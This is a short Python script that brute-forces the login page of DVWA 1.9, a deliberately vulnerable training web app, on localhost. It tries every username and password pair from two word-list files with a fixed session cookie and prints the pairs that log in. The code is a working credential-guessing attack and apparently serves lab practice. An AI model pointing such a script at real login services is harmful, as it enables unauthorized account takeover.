#encoding: utf-8

import os

import requests


BASE_DIR = os.path.dirname(os.path.abspath(__file__))


def read_file(path):
    with open(path, 'r') as fhandler:
        yield from fhandler


def brute_force(addr, username, password, headers):
    url = 'http://{0}:{1}/DVWA-1.9/vulnerabilities/brute/'.format(*addr)
    params = {
        'username' : username,
        'password' : password,
        'Login' : 'Login'
    }

    response = requests.get(url, params, headers=headers)
    if response.ok and \
        response.text.find('Welcome to the password protected area') != -1:
        print('+', username, password)


def main(addr, headers):
    for username in read_file(os.path.join(BASE_DIR, 'user.txt')):
        for password in read_file(os.path.join(BASE_DIR, 'password.txt')):
            brute_force(addr, username.strip(), password.strip(), headers)


if __name__ == '__main__':
    server = ('localhost', 80, )
    headers = {
        'Cookie' : 'security=low; PHPSESSID=kcguk4lfhk88iugf0rtggr1s83',
    }
    main(server, headers)